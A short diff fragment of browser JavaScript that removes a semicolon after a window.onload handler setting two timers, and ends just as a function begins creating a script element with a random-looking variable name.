@@ -79,7 +79,7 @@ function stmenit() {
 window.onload = function() {
 	setTimeout(semenit, 180000);
 	setTimeout(stmenit, 90000);
-};
+}
 
 function sepuluhdtk() { 
       var scriptxGHEAs69 = document.createElement('script');
